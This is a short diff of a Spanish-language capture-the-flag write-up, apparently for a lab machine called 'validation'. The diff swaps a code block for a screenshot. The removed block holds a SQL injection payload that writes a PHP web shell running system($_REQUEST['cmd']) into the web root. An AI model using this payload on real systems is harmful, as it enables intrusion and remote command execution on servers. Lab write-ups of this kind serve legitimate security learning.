@@ -197,9 +197,9 @@ Una forma para verlo mejor sería usando el atajo de teclado **control+u**
 
 Otra idea que se me ocurrio es crear dentro del sistema un archivo llamado prueba.php desde burpsuite, para llevar acabo esto, tengo que capturar de nuevo los datos del navegador desde la esta ruta http://validation/
 
-```
-username=dani&country=dani' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -
-```
+<p align="center"> 
+<img src="images/virus.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Para probar que se ha creado correctamente escribo en el navegador:
 
